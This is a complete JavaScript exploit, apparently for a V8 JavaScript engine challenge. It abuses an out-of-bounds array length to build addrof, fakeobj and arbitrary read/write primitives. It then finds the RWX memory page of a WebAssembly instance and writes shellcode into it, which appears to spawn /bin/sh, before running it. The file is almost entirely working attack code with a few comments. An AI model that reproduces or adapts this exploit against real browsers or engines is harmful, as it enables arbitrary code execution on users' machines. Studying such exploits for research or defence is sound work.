buf = new ArrayBuffer(0x8);
u64 = new BigUint64Array(buf);
f64 = new Float64Array(buf);
u32 = new Uint32Array(buf);

function info(str, val) {
    console.log(`[*] ${str}: 0x${val.toString(16)}`);
}

let oob = [1.1];
oob.length = 87;
let evil = [{}];
let leak = new BigUint64Array(1);

f64[0] = oob[110];
let high_heap = BigInt(u32[0]);
let low_heap = BigInt(u32[1]);
info("heap", low_heap + (high_heap << 32n));

function fakeobj(addr) {
    u64[0] = addr;
    oob[88] = f64[0];
    return evil[0];
}

function addrof(obj) {
    evil[0] = obj;
    f64[0] = oob[88];
    return BigInt(u32[0]);
}

function aar64(addr) {
    backup = oob[110];
    addr = (addr - 8n) | 1n;
    u64[0] = (addr << 32n) | (addr >> 32n);
    oob[110] = f64[0];
    ret = leak[0];
    f64[0] = backup;
    oob[110] = f64[0];
    return ret;
}

function aaw64(addr, val) {
    backup = oob[110];
    addr = (addr - 8n) | 1n;
    u64[0] = (addr << 32n) | (addr >> 32n);
    oob[110] = f64[0];
    u64[0] = val;
    leak[0] = u64[0];
    f64[0] = backup;
    oob[110] = f64[0];
}

// https://wasdk.github.io/WasmFiddle/
// int main() {
//   return 0x12345678;
// }
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,142,128,128,128,0,1,136,128,128,128,0,0,65,248,172,209,145,1,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var exp = wasmInstance.exports.main;
var wasmInstance_addr = (high_heap << 32n) + addrof(wasmInstance);
info("wasmInstance_addr", wasmInstance_addr);
var rwx_page = aar64(((high_heap << 32n) + addrof(wasmInstance)) - 1n + 0x60n);
info("rwx_page", rwx_page);

// from pwn import *
// context.arch = 'amd64'
// sh = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90\x90\x90'
// shs = [0x9090909090909090]*4 + [u64(sh[i:i+8]) for i in range(0, len(sh), 8)]
// print('[' + 'n, '.join(list(map(str, shs))) + 'n]')
var shellcode = new BigUint64Array([10416984888683040912n, 10416984888683040912n, 10416984888683040912n, 10416984888683040912n, 10490745906121982001n, 6042695217945480400n, 12708687932510789460n, 10416984888673898299n]);
for (var i = 0; i < shellcode.length; i++) {
    aaw64(rwx_page + BigInt(i)*8n + 0x4c0n, BigInt(shellcode[i]));
}
exp();